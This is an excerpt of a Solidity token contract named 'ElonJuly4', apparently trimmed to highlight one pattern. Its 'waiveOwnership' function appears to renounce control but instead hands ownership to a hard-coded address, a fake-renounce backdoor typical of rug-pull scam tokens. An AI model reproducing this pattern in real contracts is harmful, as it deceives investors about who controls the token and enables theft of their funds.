...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x1Eda09b2cB105f48875acB347E44AeD943eEf2ef);
    }
...
contract ElonJuly4 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ElonJuly4";
    string private _symbol = "EJ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9897e56Fa79d545251eC910b0Ff71F5e5c19987a);
    address payable public teamWalletAddress = payable(0x572f3d3DF83E5d3ea550e5Ab6caBD34BAB211E4E);
